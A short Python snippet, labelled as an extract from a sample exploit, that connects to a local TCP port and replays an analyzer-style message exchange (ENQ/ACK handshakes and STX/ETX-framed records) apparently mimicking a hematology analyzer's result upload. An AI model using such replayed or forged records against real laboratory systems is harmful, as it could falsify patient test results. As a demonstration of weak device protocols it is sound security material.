# below is a extract from a sample exploit that
# interfaces with a tcp socket
from netcat import Netcat

# start a new Netcat() instance
nc = Netcat('127.0.0.1', 5150)

# [ENQ]
nc.write('\005')

# [ACK]
nc.read_until('\006')

# STX-CR-ETX-CR-LF
# bar code is sample id
nc.write('\002D1UpocH-100i^02318729^                     201710230	           IJA31600000005900473001160036900780202452031400457107261*0000*000000430*0000*00000385001380009800095001670\003')


# [ACK]
nc.read_until('\006')

# STX-CR-ETX-CR-LF
nc.write('\002D20102050504020000072C6164370D01010304070808060505050607070707070605040303020101000001000000000000000008100B040101010203060B182D485D64563D25130A0604030303030303030303020201010100000000000000000000000000D304091A3857645E4F3E2D2117100B08050403030203030303040404040506080A0B0C1015171D272E060E0E3104310117JINO                                                                                                                            \003')

# [ACK]
nc.read_until('\006')

# [EOT]
nc.write('\004')